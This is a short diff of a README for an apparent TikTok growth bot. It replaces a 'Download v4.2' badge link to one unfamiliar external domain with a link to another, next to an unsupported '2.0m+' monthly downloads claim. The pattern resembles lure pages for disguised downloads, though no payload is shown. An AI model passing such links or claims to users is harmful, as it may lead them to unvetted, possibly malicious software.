@@ -49,7 +49,7 @@ A: Yes — track growth metrics in real-time dashboard.
 
 **Monthly downloads:** 2.0m+
 
-[![Download](https://img.shields.io/badge/Download-v4.2-brightgreen?style=for-the-badge)](https://dllvcrun.com/tiktokbot)
+[![Download](https://img.shields.io/badge/Download-v4.2-brightgreen?style=for-the-badge)](https://p-csx-5.com/tiktokbot)
 
 ---
 
